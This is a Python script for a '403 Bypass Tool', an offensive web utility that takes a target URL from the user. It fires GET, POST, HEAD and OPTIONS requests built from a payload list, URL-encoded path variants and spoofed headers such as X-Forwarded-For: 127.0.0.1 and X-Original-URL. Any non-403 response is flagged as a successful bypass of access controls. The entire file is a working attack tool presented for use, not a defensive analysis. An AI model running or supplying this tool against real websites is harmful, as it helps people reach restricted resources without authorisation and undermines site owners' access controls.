import requests
from termcolor import colored
import colorama
from urllib.parse import quote, unquote

colorama.init()

class Bypass403:
    def __init__(self, url):
        self.base_url, self.path = self.parse_url(url)
        self.methods = ["GET", "POST", "HEAD", "OPTIONS"]
        self.headers = {
            "User-Agent": "Mozilla/5.0",
            "Referer": "https://example.com",
            "X-Forwarded-For": "127.0.0.1",
            "X-Original-URL": "/",
            "X-Custom-IP-Authorization": "127.0.0.1"
        }
        self.payloads = self.load_payloads("payloads.txt")
        print(colored(f"[+] Loaded {len(self.payloads)} payloads from 'payloads.txt'", "cyan"))

    def parse_url(self, url):
        if '/' in url:
            base_url, path = url.rsplit('/', 1)
            if not path:
                path = ''
            return base_url, path
        else:
            return url, ''

    def load_payloads(self, payload_file):
        try:
            with open(payload_file, "r") as file:
                payloads = [line.strip() for line in file.readlines() if line.strip()]
            if not payloads:
                print(colored(f"[!] Payload file '{payload_file}' is empty!", "red"))
                exit(1)
            return payloads
        except FileNotFoundError:
            print(colored(f"[!] Payload file '{payload_file}' not found!", "red"))
            exit(1)

    def display_banner(self):
        banner = """
:::::::::  :::   ::: :::::::::     :::      ::::::::   ::::::::  
:+:    :+: :+:   :+: :+:    :+:  :+: :+:   :+:    :+: :+:    :+: 
+:+    +:+  +:+ +:+  +:+    +:+ +:+   +:+  +:+        +:+        
+#++:++#+    +#++:   +#++:++#+ +#++:++#++: +#++:++#++ +#++:++#++ 
+#+    +#+    +#+    +#+       +#+     +#+        +#+        +#+ 
#+#    #+#    #+#    #+#       #+#     #+# #+#    #+# #+#    #+# 
#########     ###    ###       ###     ###  ########   ########  
        
        403 Bypass Tool
        """
        print(colored(banner, "cyan"))

    def encode_payload(self, payload):
        return quote(payload)

    def decode_payload(self, payload):
        return unquote(payload)

    def generate_test_urls(self, payload):

        urls = set([
            f"{self.base_url}/{payload}/{self.path}" if self.path else f"{self.base_url}/{payload}",
            f"{self.base_url}/{self.path}/{payload}" if self.path else f"{self.base_url}/{payload}",
            f"{self.base_url}/{self.path}/{self.encode_payload(payload)}" if self.path else f"{self.base_url}/{self.encode_payload(payload)}",
            f"{self.base_url}/{self.decode_payload(payload)}/{self.path}" if self.path else f"{self.base_url}/{self.decode_payload(payload)}"
        ])
        return urls

    def bypass(self):
        successful_urls = set() 
        payloads_checked = 0

        for method in self.methods:
            for payload in self.payloads:
                payloads_checked += 1
                test_urls = self.generate_test_urls(payload)
                payload_bypassed = False

                for target_url in test_urls:
                    print(f"\n[+] Trying method: {method} with payload: {target_url}")
                    try:
                        response = requests.request(method, target_url, headers=self.headers)
                        status_code = response.status_code
                        if status_code == 200:
                            print(colored(f"[+] Status code 200 received with payload: {payload}", "green"))
                            successful_urls.add(target_url)  
                            payload_bypassed = True
                            break 
                        elif status_code != 403:
                            print(colored(f"[+] Bypass might be successful! Status code: {status_code}", "yellow"))
                            print(colored(f"[+] Bypass Payload: {payload}", "yellow"))
                            payload_bypassed = True
                            break  
                        else:
                            print(colored(f"[-] Method {method} with payload {payload} failed. Status code: {status_code}", "red"))
                    except requests.RequestException as e:
                        print(colored(f"[!] Request failed: {e}", "red"))

        
                if payload_bypassed:
                    break

        print(f"\n[+] Checked {payloads_checked} payloads.")
        if successful_urls:
            print("\n[+] URLs that returned status code 200:")
            for url in successful_urls:
                print(colored(url, "green"))
        else:
            print(colored("\n[+] All payloads were successfully tested.", "cyan"))

if __name__ == "__main__":

    Bypass403.display_banner(None)
    
    target_url = input("Enter the URL (e.g., https://www.example.com/secret): ")

    bypass_tool = Bypass403(target_url)
    bypass_tool.bypass()
